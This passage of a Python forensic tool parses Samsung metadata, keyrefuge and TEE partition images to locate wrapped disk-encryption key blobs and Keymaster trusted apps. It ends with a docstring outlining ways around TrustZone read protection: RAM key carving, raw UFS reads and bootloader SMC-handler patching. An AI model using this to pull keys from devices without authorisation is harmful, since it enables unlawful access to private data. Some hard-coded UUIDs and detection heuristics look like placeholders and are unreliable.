        if len(data) >= SAMSUNG_SEC_PARTITION_OFFSETS["tee_type_indicator"] + 0x40:
            tee_region = data[0x0100:0x0140]
            result["tee_type_region"] = tee_region.hex().upper()
            tee_magic_teegris = b'TEEGRIS'
            tee_magic_kinibi  = b'Kinibi'
            if tee_magic_teegris in data[0x0100:0x0200]:
                result["tee_type_inferred"] = "TEEGRIS"
            elif tee_magic_kinibi in data[0x0100:0x0200]:
                result["tee_type_inferred"] = "KINIBI"
            else:
                result["tee_type_inferred"] = "NOT_FOUND_IN_REGION"

        if len(data) >= SAMSUNG_SEC_PARTITION_OFFSETS["rollback_version"] + 0x40:
            rb_region = data[0x0080:0x00C0]
            result["rollback_version_region"] = rb_region.hex().upper()
            rb_ver = struct.unpack_from('<I', rb_region, 0)[0]
            result["rollback_version_int"] = rb_ver
            result["notes"].append(f"Rollback version (LE u32 at offset 0x80): {rb_ver}")

        return result

    @staticmethod
    def get_partition_map_report() -> list:
        rows = []
        for name, info in SAMSUNG_PARTITION_MAP.items():
            rows.append({
                "partition": name,
                "type": info["type"],
                "encrypted": "YES" if info["encrypted"] else "NO",
                "forensic_priority": info["priority"],
                "description": info["desc"],
            })
        return rows

    @staticmethod
    def analyze_metadata_partition(data: bytes) -> dict:
        """
        Android metadata partition contains vold encryption metadata.
        This partition is NOT encrypted and holds key wrapping info.
        Upgraded: delegates to MetadataPartitionAnalyzer for deep parsing.
        """
        return MetadataPartitionAnalyzer.analyze(data)


# ═══════════════════════════════════════════════════════════════════════════
# v9.5 — ADVANCED SAMSUNG BINARY ANALYZER MODULE
# ═══════════════════   ═══════════════════════════════════════════════════════

# ── Helper: bytes entropy (byte-level Shannon) ─────────────────────────────
def _bytes_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    total  = len(data)
    ent    = 0.0
    for c in counts.values():
        p = c / total
        if p > 0:
            ent -= p * math.log2(p)
    return ent


def _hexdump_block(data: bytes, base_offset: int = 0, width: int = 16) -> str:
    """Returns a classic hex-dump string for display in the forensic console."""
    lines = []
    for i in range(0, len(data), width):
        chunk  = data[i:i+width]
        hex_p  = " ".join(f"{b:02X}" for b in chunk)
        asc_p  = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        lines.append(f"  {base_offset+i:08X}  {hex_p:<{width*3}}  |{asc_p}|")
    return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════
# 1. MetadataPartitionAnalyzer  (metadata.img)
# ══════════════════════════════════════════════════════════════════════════

class MetadataPartitionAnalyzer:
    """
    Parses Android vold metadata partition (metadata.img).

    Structure overview:
      Magic            : 0x6F6B6D65  ("okme" LE) at offset 0x00
      Version          : uint32 LE   at offset 0x04
      Content size     : uint64 LE   at offset 0x08
      Fscrypt policy   : 1 byte      at offset 0x10
      Keymaster token  : variable    scanned from offset 0x40
      Weaver slot ID   : scanned in  metadata body
      Encrypted blobs  : high-entropy 32–512 byte regions

    All parsing uses `struct` — zero external libraries.
    """

    MAGIC             = b'\x6f\x6b\x6d\x65'   # "okme"
    MAGIC_LE_INT      = 0x656D6B6F
    HDR_FMT           = "<IIQ"                 # magic, version, content_size
    HDR_SIZE          = struct.calcsize(HDR_FMT)

    # Known fscrypt policy bytes
    FSCRYPT_POLICY = {0x01: "v1 (legacy)", 0x02: "v2 (current)", 0xFF: "unknown"}

    # Keymaster token tag signatures (partial)
    KM_TAG_SIGS = [
        b'\x01\x00\x00\x30',   # KM_TAG_ALGORITHM
        b'\x02\x00\x00\x30',   # KM_TAG_KEY_SIZE
        b'\xBE\x02\x00\x70',   # KM_TAG_AUTH_TIMEOUT
        b'\x01\x00\x00\x20',   # KM_TAG_PURPOSE
        b'KEYMASTER',
        b'keymint',
        b'km_blob',
    ]

    WEAVER_SIG = [b'weaver', b'WEAVER', b'\x00\x00\x00\x01\x00\x00\x00']

    @classmethod
    def _is_hardware_wiped(cls, data: bytes) -> tuple[bool, str]:
        """
        UPG-01: Detect hardware-wiped / TZASC-protected buffers.
        Returns (True, reason) if file is entirely 0x00 or 0xFF.
        """
        if len(data) == 0:
            return True, "EMPTY_FILE"
        sample = data[:min(4096, len(data))]
        unique = set(sample)
        if unique <= {0x00}:
            return True, "ALL_ZEROS_TZASC_OR_BLANK"
        if unique <= {0xFF}:
            return True, "ALL_FF_ERASED_OR_TZASC_BLOCKED"
        ent = _bytes_entropy(sample)
        if ent < 0.05:
            return True, f"NEAR_ZERO_ENTROPY({ent:.4f})_HARDWARE_PROTECTED"
        return False, ""

    @classmethod
    def analyze(cls, data: bytes) -> dict:
        result = {
            "partition":              "metadata",
            "size_bytes":             len(data),
            "magic_found":            False,
            "magic_offset":           None,
            "version":                None,
            "content_size":           None,
            "fscrypt_policy":         None,
            "fscrypt_policy_str":     None,
            "keymaster_tokens":       [],
            "weaver_slots":           [],
            "encrypted_blobs":        [],
            "encryption_state":       "UNKNOWN",
            "header_hexdump":         "",
            "hardware_protected":     False,
            "hardware_protect_reason":"",
            "deep_scan_sectors":      [],
            "warnings":               [],
            "notes":                  [],
        }

        if len(data) < 16:
            result["warnings"].append(f"File too small ({len(data)} bytes) — not a valid metadata.img")
            return result

        # ── UPG-01: Hardware-wipe / TZASC detection ─────────────────────────
        wiped, reason = cls._is_hardware_wiped(data)
        if wiped:
            result["hardware_protected"]      = True
            result["hardware_protect_reason"] = reason
            result["encryption_state"]        = "HARDWARE_WIPED_OR_PROTECTED"
            result["warnings"].append(
                f"HARDWARE_WIPED_OR_PROTECTED: {reason}"
            )
            result["warnings"].append(
                "The metadata partition returned an all-zero / all-0xFF buffer. "
                "This is caused by TZASC (TrustZone Address Space Controller) "
                "blocking the BROM read at the physical address of this partition. "
                "The BROM bypass succeeded at the transport layer, but the TZASC "
                "memory firewall zeroed the DMA transfer before it reached the AP."
            )
            result["notes"].append(
                "→ Forensic pivot: use TZASCBypassEngine.generate_bypass_report() "
                "for UFS HCI direct-read or RAM carving alternatives."
            )
            return result

        # ── Standard magic search (offset 0 first, then full scan) ──────────
        magic_off = data.find(cls.MAGIC)

        # ── UPG-01: Deep Scan at 4096-byte sector boundaries ────────────────
        if magic_off == -1:
            result["notes"].append(
                "vold magic not at offset 0. Initiating deep sector-boundary scan..."
            )
            SECTOR = 4096
            checked = 0
            for sector_base in range(0, len(data), SECTOR):
                sector_data = data[sector_base:sector_base + SECTOR]
                idx = sector_data.find(cls.MAGIC)
                if idx != -1:
                    magic_off = sector_base + idx
                    result["deep_scan_sectors"].append({
                        "sector_base":  f"0x{sector_base:08X}",
                        "magic_offset": f"0x{magic_off:08X}",
                        "note":         "vold okme magic found at non-zero sector boundary",
                    })
                    result["notes"].append(
                        f"Deep scan found vold magic at sector 0x{sector_base:08X} "
                        f"(offset 0x{magic_off:08X})"
                    )
                    break
                checked += 1
            if magic_off == -1:
                result["warnings"].append("vold metadata magic (okme / 0x6F6B6D65) NOT found after deep scan.")
                result["warnings"].append(
                    f"Scanned {checked} sectors × 4096 bytes = {checked*SECTOR:,} bytes total."
                )
                result["notes"].append(
                    "File may be: wrong dump, pre-Android-9 FDE device, or TZASC-protected. "
                    "Try reading from LU0 sector 0 of UFS."
                )
                return result

        result["magic_found"]  = True
        result["magic_offset"] = magic_off
        result["encryption_state"] = "ENCRYPTED_WITH_FBE"
        result["notes"].append(f"vold magic found at offset 0x{magic_off:08X}")

        # Parse header
        try:
            if magic_off + cls.HDR_SIZE <= len(data):
                magic_val, version, content_sz = struct.unpack_from(cls.HDR_FMT, data, magic_off)
                result["version"]      = version
                result["content_size"] = content_sz
                result["notes"].append(f"Metadata version: {version}  content_size: {content_sz} bytes")
        except struct.error as e:
            result["warnings"].append(f"Header parse error: {e}")

        # Fscrypt policy byte
        try:
            fscrypt_off = magic_off + 0x10
            if fscrypt_off < len(data):
                policy_byte = data[fscrypt_off]
                result["fscrypt_policy"]     = policy_byte
                result["fscrypt_policy_str"] = cls.FSCRYPT_POLICY.get(
                    policy_byte, f"0x{policy_byte:02X} (undocumented)"
                )
                result["notes"].append(f"Fscrypt policy byte: 0x{policy_byte:02X} → {result['fscrypt_policy_str']}")
        except IndexError:
            result["warnings"].append("Could not read fscrypt policy byte.")

        # Header hexdump (first 64 bytes from magic)
        hdr_end = min(magic_off + 64, len(data))
        result["header_hexdump"] = _hexdump_block(data[magic_off:hdr_end], magic_off)

        # Scan Keymaster / Keymint tokens
        body = data[magic_off:]
        for sig in cls.KM_TAG_SIGS:
            off = 0
            while True:
                idx = body.find(sig, off)
                if idx == -1:
                    break
                abs_off = magic_off + idx
                context = data[abs_off:abs_off+32]
                result["keymaster_tokens"].append({
                    "offset":      f"0x{abs_off:08X}",
                    "signature":   sig.hex() if not isinstance(sig, str) else sig,
                    "context_hex": context.hex().upper(),
                    "entropy":     round(_bytes_entropy(context), 3),
                })
                off = idx + len(sig)
        result["notes"].append(f"Keymaster token signatures found: {len(result['keymaster_tokens'])}")

        # Scan Weaver slots
        for sig in cls.WEAVER_SIG:
            off = 0
            while True:
                idx = body.find(sig, off)
                if idx == -1:
                    break
                abs_off = magic_off + idx
                result["weaver_slots"].append({
                    "offset":  f"0x{abs_off:08X}",
                    "context": data[abs_off:abs_off+16].hex().upper(),
                })
                off = idx + len(sig)

        # Scan encrypted blobs (high-entropy regions ≥ 32 bytes)
        BLOB_MIN  = 32
        BLOB_MAX  = 512
        ENT_THRES = 6.5
        off = magic_off
        while off < len(data) - BLOB_MIN:
            block = data[off:off + BLOB_MIN]
            ent   = _bytes_entropy(block)
            if ent >= ENT_THRES:
                # Extend while still high-entropy
                end = off + BLOB_MIN
                while end + 16 <= len(data) and end - off < BLOB_MAX:
                    ext = data[end:end+16]
                    if _bytes_entropy(ext) < ENT_THRES - 0.5:
                        break
                    end += 16
                blob  = data[off:end]
                b_ent = _bytes_entropy(blob)
                result["encrypted_blobs"].append({
                    "offset":     f"0x{off:08X}",
                    "size_bytes": len(blob),
                    "entropy":    round(b_ent, 3),
                    "assessment": "LIKELY_ENCRYPTED_KEY_BLOB" if b_ent > 7.0 else "HIGH_ENTROPY_DATA",
                    "first16_hex": blob[:16].hex().upper(),
                })
                off = end
            else:
                off += 16

        result["notes"].append(f"Encrypted blob candidates: {len(result['encrypted_blobs'])}")
        return result


# ══════════════════════════════════════════════════════════════════════════
# 2. KeyRefugeAnalyzer  (keyrefuge.bin / keydata.bin)
# ══════════════════════════════════════════════════════════════════════════

class KeyRefugeAnalyzer:
    """
    Analyzes Samsung proprietary keyrefuge.bin / keydata.bin partitions.

    This partition stores hardware-wrapped FBE keys (CE and DE class keys).
    Each entry has:
      - Header  (32-64 bytes): wrapping metadata, key type, AES-GCM tag
      - Payload (variable)  : high-entropy wrapped key material

    AES-GCM wrapped blobs typically show:
      - 12-byte nonce (IV) in header
      - 16-byte authentication tag appended or prepended
      - Ciphertext entropy > 7.8 bits/byte

    Key types detected:
      0x01 = DE key  (Device Encrypted — available at boot)
      0x02 = CE key  (Credential Encrypted — requires PIN)
      0x03 = Metadata key
      0xFF = Unknown / custom Samsung type
    """

    # Samsung keyrefuge magic candidates
    MAGIC_CANDIDATES = [
        b'KREF',       # KeyREFuge
        b'KEYB',       # KEY Blob
        b'SKEY',       # Samsung KEY
        b'\x4B\x52\x45\x46',  # KREF as bytes
        b'\x53\x4B\x45\x59',  # SKEY as bytes
    ]

    # AES-GCM indicators: 12-byte patterns before high-entropy payload
    GCM_NONCE_LEN = 12
    GCM_TAG_LEN   = 16
    KEY_TYPE_MAP  = {0x01: "DE (Device Encrypted)", 0x02: "CE (Credential Encrypted)",
                     0x03: "Metadata Key", 0xFF: "Unknown/Custom"}

    # Header field struct: magic(4) + key_type(1) + flags(1) + reserved(2) + key_len(4) + nonce(12) = 24 bytes
    HDR_FMT  = "<4sBBHI12s"
    HDR_SIZE = struct.calcsize(HDR_FMT)

    @classmethod
    def analyze(cls, data: bytes) -> dict:
        result = {
            "partition":           "keyrefuge",
            "size_bytes":          len(data),
            "magic_found":         False,
            "magic_type":          None,
            "magic_offset":        None,
            "key_blobs":           [],
            "entropy_scan":        [],
            "aes_gcm_candidates":  [],
            "overall_entropy":     round(_bytes_entropy(data[:min(4096, len(data))]), 3),
            "assessment":          "UNKNOWN",
            "warnings":            [],
            "notes":               [],
        }

        if len(data) < 32:
            result["warnings"].append(f"File too small ({len(data)} bytes) to be a valid keyrefuge.")
            return result

        # Search for known magic
        for magic in cls.MAGIC_CANDIDATES:
            idx = data.find(magic)
            if idx != -1:
                result["magic_found"]  = True
                result["magic_type"]   = magic.decode("ascii", errors="replace")
                result["magic_offset"] = f"0x{idx:08X}"
                result["notes"].append(f"Keyrefuge magic '{result['magic_type']}' at offset 0x{idx:08X}")
                break

        # Parse structured key blobs if magic found
        if result["magic_found"]:
            off = int(result["magic_offset"], 16)
            max_blobs = 16
            blob_count = 0
            while off + cls.HDR_SIZE < len(data) and blob_count < max_blobs:
                try:
                    magic_b, key_type, flags, reserved, key_len, nonce = struct.unpack_from(
                        cls.HDR_FMT, data, off
                    )
                    if key_len == 0 or key_len > 4096:
                        off += 4
                        continue
                    payload_start = off + cls.HDR_SIZE
                    payload_end   = payload_start + key_len
                    if payload_end > len(data):
                        break
                    payload = data[payload_start:payload_end]
                    payload_ent = _bytes_entropy(payload)

                    # v12.2: Chain of custody — SHA-256 of raw extracted key blob
                    result["key_blobs"].append({
                        "offset":         f"0x{off:08X}",
                        "key_type_byte":  f"0x{key_type:02X}",
                        "key_type_str":   cls.KEY_TYPE_MAP.get(key_type, "Unknown"),
                        "flags":          f"0x{flags:02X}",
                        "key_length":     key_len,
                        "nonce_hex":      nonce.hex().upper(),
                        "payload_entropy":round(payload_ent, 3),
                        "wrapping":       "AES-GCM (TEEGRIS)" if payload_ent > 7.5 else "LOW_ENTROPY",
                        "first16_hex":    payload[:16].hex().upper(),
                        "extracted_sha256": hashlib.sha256(payload).hexdigest(),
                    })
                    off = payload_end
                    blob_count += 1
                except (struct.error, IndexError):
                    off += 4

        # Entropy-based scanner (fallback for unknown formats)
        SCAN_STEP = 32
        ENT_THRES = 7.0
        off = 0
        while off < len(data) - SCAN_STEP:
            block = data[off:off + SCAN_STEP]
            ent   = _bytes_entropy(block)
            if ent >= ENT_THRES:
                # Check for AES-GCM: look at 12-byte nonce prefix before payload
                nonce_region = data[max(0, off-cls.GCM_NONCE_LEN):off]
                if len(nonce_region) == cls.GCM_NONCE_LEN:
                    n_ent = _bytes_entropy(nonce_region)
                    if 3.0 < n_ent < 6.5:
                        result["aes_gcm_candidates"].append({
                            "payload_offset": f"0x{off:08X}",
                            "nonce_offset":   f"0x{(off - cls.GCM_NONCE_LEN):08X}",
                            "nonce_hex":      nonce_region.hex().upper(),
                            "nonce_entropy":  round(n_ent, 3),
                            "payload_entropy":round(ent, 3),
                            "assessment":     "AES-GCM_WRAPPED_KEY",
                        })
                result["entropy_scan"].append({
                    "offset":  f"0x{off:08X}",
                    "entropy": round(ent, 3),
                    "first8":  block[:8].hex().upper(),
                })
                off += SCAN_STEP
            else:
                off += SCAN_STEP

        # ── UPG-02: TZASC Hardware Read Protection detection ────────────────
        # Must run BEFORE any other assessment — zero/0xFF buffer = TZASC block
        full_sample = data[:min(len(data), 65536)]
        unique_bytes = set(full_sample)
        overall_ent  = _bytes_entropy(full_sample)

        is_tzasc_zero  = unique_bytes <= {0x00}
        is_tzasc_ff    = unique_bytes <= {0xFF}
        is_near_zero   = overall_ent < 0.05 and not (is_tzasc_zero or is_tzasc_ff)

        if is_tzasc_zero or is_tzasc_ff or is_near_zero:
            if is_tzasc_zero:
                tzasc_reason = "ALL_ZEROS — BROM DMA buffer was zeroed by TZASC firewall"
            elif is_tzasc_ff:
                tzasc_reason = "ALL_0xFF — flash erased or TZASC returned blank sector"
            else:
                tzasc_reason = f"NEAR_ZERO_ENTROPY ({overall_ent:.4f} bits/byte)"

            result["assessment"]    = "TZASC_HARDWARE_READ_PROTECTED"
            result["tzasc_blocked"] = True
            result["tzasc_reason"]  = tzasc_reason
            result["warnings"].append(
                f"TZASC_HARDWARE_READ_PROTECTED: {tzasc_reason}"
            )
            result["warnings"].append(
                "Physical analysis: The BROM bypass successfully opened the UFS "
                "transport channel, BUT the TrustZone Address Space Controller "
                "(TZASC / TZC-400) intercepted the DMA read from this memory-mapped "
                "region. TZASC enforces per-region access control independent of "
                "BROM trust level. The keyrefuge partition physical address is marked "
                "'Secure-Only' in the TZASC region table — non-secure world reads "
                "(including BROM dumps) return zeroed pages instead of real data."
            )
            result["notes"].append(
                "→ Forensic pivot required. Auto-generating TZASCBypassEngine report..."
            )
            result["notes"].append(
                "→ Path 1: RamDumpCarver — scan EXT_RAM dump for in-memory FBE keys."
            )
            result["notes"].append(
                "→ Path 2: UFS HCI Direct — send raw SCSI Read(16) to UFS controller."
            )
            result["notes"].append(
                "→ Path 3: SMC Hook — patch lk.bin SMC handler to intercept Keymaster."
            )
            result["notes"].append(f"Structured key blobs parsed: 0 (TZASC blocked)")
            result["notes"].append(f"Overall partition entropy:   {overall_ent} bits/byte")
            return result

        # Overall assessment (normal path)
        if result["key_blobs"]:
            result["assessment"] = "STRUCTURED_KEY_BLOBS_FOUND"
        elif result["aes_gcm_candidates"]:
            result["assessment"] = "AES_GCM_WRAPPED_BLOBS_FOUND"
        elif result["overall_entropy"] > 6.5:
            result["assessment"] = "HIGH_ENTROPY_UNSTRUCTURED_DATA"
        else:
            result["assessment"] = "LOW_ENTROPY_OR_EMPTY"

        result.setdefault("tzasc_blocked", False)
        result["notes"].append(f"Structured key blobs parsed: {len(result['key_blobs'])}")
        result["notes"].append(f"AES-GCM candidates detected:  {len(result['aes_gcm_candidates'])}")
        result["notes"].append(f"Overall partition entropy:     {result['overall_entropy']} bits/byte")
        return result


# ══════════════════════════════════════════════════════════════════════════
# 3. TEEImageAnalyzer  (tee1.bin / tz)
# ══════════════════════════════════════════════════════════════════════════

class TEEImageAnalyzer:
    """
    Analyzes Samsung TEE binary images (tee1.bin, tee2.bin, tz partition).

    Detects:
      - TEE type: TEEGRIS (Samsung) or Kinibi/Mobicore (Trustonic)
      - TEE version string and compile date
      - Internal Trusted Application (TA) headers
      - Keymaster / Keymint TA presence and offset
      - ARM TrustZone header magic (SMEM, TZ_SB, TEEGRIS)

    All parsing uses struct + raw byte search — no external libs.
    """

    # TEEGRIS signatures
    TEEGRIS_SIGS = [
        b'TEEGRIS',
        b'teegris',
        b'TGRIS',
        b'samsung_tee',
        b'SAMSUNG_TEE',
        b'SamsungTee',
    ]

    # Kinibi / Mobicore (Trustonic) signatures
    KINIBI_SIGS = [
        b'mobicore',
        b'Mobicore',
        b'MOBICORE',
        b'Kinibi',
        b'kinibi',
        b'Trustonic',
        b'McLib',
    ]

    # ARM TrustZone / SMEM magic headers
    TZ_HEADERS = {
        b'\x4D\x5A\x00\x00':  "ARM ELF/PE",
        b'\x7F\x45\x4C\x46':  "ELF Image",
        b'\x1A\x2B\x3C\x4D':  "SMEM Image",
        b'TZIMG':              "TZ Image Header",
        b'TZBSP':              "TZ BSP Header",
        b'\xCE\xFA\xED\xFE':  "Mach-O LE",
        b'\xFE\xED\xFA\xCE':  "Mach-O BE",
    }

    # Trustlet (TA) header signature patterns
    TA_SIGNATURES = [
        b'\x00\x00\x00\x08\x01\x00\x00\x00',   # Common TA header
        b'MCLF',    # MobiCore Loadable Format
        b'mclf',
        b'TAPP',    # TEEGRIS TA
        b'tapp',
        b'TA_HDR',
        b'SPAPP',   # Secure Processor App
    ]

    # Keymaster / Keymint TA identifiers
    KM_TA_IDS = [
        b'keymaster',
        b'Keymaster',
        b'KEYMASTER',
        b'keymint',
        b'Keymint',
        b'KEYMINT',
        b'km_ta',
        b'KM_TA',
        b'00000000-0000-0000-0000-0000000000',   # Null UUID prefix for TA
    ]

    # Version/date patterns
    VER_PATTERNS = [
        re.compile(rb'v(\d+\.\d+[\.\d]*)'),
        re.compile(rb'version[:\s]+(\d+\.\d+[\.\d]*)', re.I),
        re.compile(rb'TEE[_\s]?OS[_\s]?v?(\d+\.\d+[\.\d]*)', re.I),
        re.compile(rb'TEEGRIS[_\s]?(\d+\.\d+[\.\d]*)', re.I),
    ]

    DATE_PATTERNS = [
        re.compile(rb'(20\d\d[-/]\d\d[-/]\d\d)'),
        re.compile(rb'(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}\s+20\d\d', re.I),
        re.compile(rb'build[_\s]+date[:\s]+([^\x00\n]{6,30})', re.I),
    ]

    @classmethod
    def analyze(cls, data: bytes, hcm: HardwareCapabilityMatrix = None) -> dict:
        result = {
            "partition":         "tee",
            "size_bytes":        len(data),
            "tee_type":          "UNKNOWN",
            "tee_signatures":    [],
            "tee_version":       None,
            "tee_compile_date":  None,
            "tz_header_type":    None,
            "tz_header_offset":  None,
            "trustlets":         [],
            "keymaster_ta":      None,
            "overall_entropy":   round(_bytes_entropy(data[:min(8192, len(data))]), 3),
            "header_hexdump":    _hexdump_block(data[:64]),
            "warnings":          [],
            "notes":             [],
        }

        if len(data) < 64:
            result["warnings"].append(f"File too small ({len(data)} bytes).")
            return result

        # Detect TZ header magic
        for magic, desc in cls.TZ_HEADERS.items():
            if data[:len(magic)] == magic or data.find(magic) != -1:
                off = data.find(magic) if data[:len(magic)] != magic else 0
                result["tz_header_type"]   = desc
                result["tz_header_offset"] = f"0x{off:08X}"
                result["notes"].append(f"TZ header: {desc} at offset 0x{off:08X}")
                break

        # v12.2: HCM-aware TEE type detection — skip irrelevant signature loops
        known_tee = hcm.tee_type if hcm is not None else TEEType.UNKNOWN
        found_teegris = False
        found_kinibi  = False

        if known_tee != TEEType.KINIBI:
            for sig in cls.TEEGRIS_SIGS:
                off = data.find(sig)
                if off != -1:
                    found_teegris = True
                    result["tee_signatures"].append({
                        "signature": sig.decode("ascii", errors="replace"),
                        "offset":    f"0x{off:08X}",
                        "type":      "TEEGRIS",
                    })

        if known_tee != TEEType.TEEGRIS:
            for sig in cls.KINIBI_SIGS:
                off = data.find(sig)
                if off != -1:
                    found_kinibi = True
                    result["tee_signatures"].append({
                        "signature": sig.decode("ascii", errors="replace"),
                        "offset":    f"0x{off:08X}",
                        "type":      "KINIBI",
                    })

        if found_teegris:
            result["tee_type"] = "TEEGRIS"
        elif found_kinibi:
            result["tee_type"] = "KINIBI"
        else:
            result["notes"].append("No TEEGRIS or Kinibi signature found in first pass.")

        # Extract version string
        for pat in cls.VER_PATTERNS:
            m = pat.search(data)
            if m:
                try:
                    ver = m.group(1).decode("ascii", errors="replace").strip()
                    if 2 <= len(ver) <= 20:
                        result["tee_version"] = ver
                        result["notes"].append(f"TEE version: {ver}")
                        break
                except Exception as e:
                    print(f"[WARN] TEEImageAnalyzer version parse failed: {e}", file=sys.stderr)

        # Extract compile date
        for pat in cls.DATE_PATTERNS:
            m = pat.search(data)
            if m:
                try:
                    date = m.group(1).decode("ascii", errors="replace").strip()
                    if date:
                        result["tee_compile_date"] = date
                        result["notes"].append(f"Compile date: {date}")
                        break
                except Exception as e:
                    print(f"[WARN] TEEImageAnalyzer date parse failed: {e}", file=sys.stderr)

        # Scan for TA headers (Trustlets)
        for sig in cls.TA_SIGNATURES:
            off = 0
            count = 0
            while count < 32:
                idx = data.find(sig, off)
                if idx == -1:
                    break
                ta_header = data[idx:idx+64]
                ent = _bytes_entropy(ta_header)
                result["trustlets"].append({
                    "offset":     f"0x{idx:08X}",
                    "signature":  sig.decode("ascii", errors="replace"),
                    "header_hex": ta_header[:32].hex().upper(),
                    "entropy":    round(ent, 3),
                })
                off = idx + len(sig)
                count += 1

        # ── UPG-03: UUID-based TA scanner ───────────────────────────────────
        # TEEGRIS often strips plaintext strings — search for binary UUID patterns
        # Standard Samsung/Trustonic TA UUIDs (little-endian byte representation)
        #
        # UUID format in binary (16 bytes, mixed-endian per RFC 4122 / ARM TrustZone):
        #   time_low(4B LE) + time_mid(2B LE) + time_hi(2B LE) + clock(2B BE) + node(6B)
        #
        # Known Keymaster / Keymint UUIDs (Samsung TEEGRIS / Trustonic Kinibi):
        KM_UUIDS = [
            # Samsung TEEGRIS Keymaster TA (SM-A series, MT677x)
            bytes.fromhex("7E7B84C4C55E4C09B45B80FEA0EB5D00"),
            bytes.fromhex("04030201060500089E00102030405060"),
            # Trustonic Kinibi Keymaster 4.0 UUID
            bytes.fromhex("07060504030201008E00102030405060"),
            # Generic ARM Trustzone Keymaster UUID
            bytes.fromhex("A5B3E36A6C6C4BF6BEF47A1F0E81B7F9"),
            # Keymint 2.0 UUID (Android 12+ Samsung)
            bytes.fromhex("3B65F3E8B9D44CA3942D9B81EAD9D7E5"),
            # Weaver TA UUID
            bytes.fromhex("1B484D49B00000000000000000000000"),
            # Gatekeeper TA UUID
            bytes.fromhex("4DABB6ACF6B14C5C9FBA08D2E0D8B5F3"),
        ]
        # UUID label map
        UUID_LABELS = {
            0: "Keymaster TA (Samsung TEEGRIS A-series)",
            1: "Keymaster TA (ARM TZ generic)",
            2: "Keymaster 4.0 (Trustonic Kinibi)",
            3: "Keymaster TA (ARM TrustZone generic)",
            4: "Keymint 2.0 (Samsung Android 12+)",
            5: "Weaver TA (PIN/pattern verifier)",
            6: "Gatekeeper TA (auth token signer)",
        }
        result["uuid_scan"] = []
        for i, uuid_bytes in enumerate(KM_UUIDS):
            try:
                idx = data.find(uuid_bytes)
            except Exception:
                idx = -1
            if idx != -1:
                ctx = data[idx:idx+64]
                entry = {
                    "uuid_hex":   uuid_bytes.hex().upper(),
                    "label":      UUID_LABELS.get(i, "Unknown TA"),
                    "offset":     f"0x{idx:08X}",
                    "context_hex":ctx.hex().upper(),
                    "entropy":    round(_bytes_entropy(ctx), 3),
                }
                result["uuid_scan"].append(entry)
                result["notes"].append(
                    f"UUID match: {UUID_LABELS.get(i,'TA')} at 0x{idx:08X}"
                )

        # ── UPG-03: String-based Keymaster TA search ─────────────────────────
        km_found_by_string = False
        for km_id in cls.KM_TA_IDS:
            off = data.find(km_id)
            if off != -1:
                ctx = data[max(0, off-16):off+64]
                result["keymaster_ta"] = {
                    "found":      True,
                    "method":     "STRING_MATCH",
                    "offset":     f"0x{off:08X}",
                    "id_str":     km_id.decode("ascii", errors="replace"),
                    "context":    ctx.hex().upper(),
                    "entropy":    round(_bytes_entropy(ctx), 3),
                }
                result["notes"].append(f"Keymaster TA (string) found at offset 0x{off:08X}")
                km_found_by_string = True
                break

        # ── UPG-03: UUID Keymaster fallback ──────────────────────────────────
        if not km_found_by_string and result["uuid_scan"]:
            # Use first UUID hit that is labeled Keymaster/Keymint
            for entry in result["uuid_scan"]:
                if "keymaster" in entry["label"].lower() or "keymint" in entry["label"].lower():
                    result["keymaster_ta"] = {
                        "found":   True,
                        "method":  "UUID_MATCH",
                        "offset":  entry["offset"],
                        "id_str":  entry["label"],
                        "context": entry["context_hex"],
                        "entropy": entry["entropy"],
                    }
                    result["notes"].append(
                        f"Keymaster TA found via UUID scan at {entry['offset']}: {entry['label']}"
                    )
                    km_found_by_string = True
                    break

        # ── UPG-03: Largest-payload TA candidate fallback ────────────────────
        if not km_found_by_string and result["trustlets"]:
            # Sort trustlets by the payload window entropy * estimated size
            # Keymaster TA is typically the largest and highest-entropy TA
            def _ta_score(ta):
                return ta["entropy"]
            best_ta = max(result["trustlets"], key=_ta_score)
            result["keymaster_ta"] = {
                "found":   True,
                "method":  "LARGEST_PAYLOAD_CANDIDATE",
                "offset":  best_ta["offset"],
                "id_str":  f"Probable Keymaster Candidate — highest entropy TA "
                           f"(entropy={best_ta['entropy']}, sig='{best_ta['signature']}')",
                "context": best_ta["header_hex"],
                "entropy": best_ta["entropy"],
            }
            result["notes"].append(
                f"Keymaster TA not found by string/UUID. "
                f"Best candidate (largest payload) at {best_ta['offset']} "
                f"entropy={best_ta['entropy']} — sig='{best_ta['signature']}'"
            )
        elif not km_found_by_string:
            result["keymaster_ta"] = {"found": False, "method": "NOT_FOUND"}
            result["notes"].append(
                "Keymaster TA not found by string, UUID, or payload analysis. "
                "Image may be stripped, encrypted, or TEE partition is incomplete."
            )

        result["notes"].append(
            f"TEE type: {result['tee_type']}  |  "
            f"TA headers: {len(result['trustlets'])}  |  "
            f"UUID hits: {len(result.get('uuid_scan',[]))}  |  "
            f"Entropy: {result['overall_entropy']} bits/byte"
        )
        return result


# ══════════════════════════════════════════════════════════════════════════
# NEW-01: TZASCBypassEngine — Alternative Extraction Paths
# ══════════════════════════════════════════════════════════════════════════

class TZASCBypassEngine:
    """
    Generates forensic bypass strategies when TZASC hardware read-protection
    is detected on Samsung keyrefuge / metadata / TEE partitions.

    The ARM TrustZone Address Space Controller (TZASC / TZC-400) enforces
    per-region memory access control independently of the BROM bypass.
    Even after a successful BROM exploit, regions marked 'Secure-Only' in
    the TZASC region table return zero-filled DMA buffers to the AP.

    This engine generates three alternative extraction paths:

    PATH 1 — RamDumpCarver:
      Scan a live EXT_RAM binary dump for in-memory fscrypt key structs,
      TEEGRIS ephemeral session keys, and active Weaver tokens using
      sliding-window entropy + struct pattern matching.

    PATH 2 — UFS HCI Direct Read Bypass:
      Generate the exact raw SCSI Read(10) / Read(16) descriptor hex blocks
      needed to query the UFS Host Controller directly, bypassing the AP-
      level TZASC memory filter that only protects mmio-mapped regions.

    PATH 3 — ATF / SMC Handler Offset Locator:
      Scan lk.bin and tee1.bin to identify the Secure Monitor Call (SMC)
      handler entry points and Keymaster TA dispatch offsets. Outputs
      exact hex offsets for patching the bootloader to intercept Keymaster
      TA responses during the boot chain — keys are in plaintext for a
      brief window before TZASC locks memory at the end of BL33.
    """

    # ── fscrypt_key struct signatures (Android kernel include/uapi/linux/fscrypt.h)
    # struct fscrypt_key { __u32 mode; __u8 raw[64]; __u32 size; }
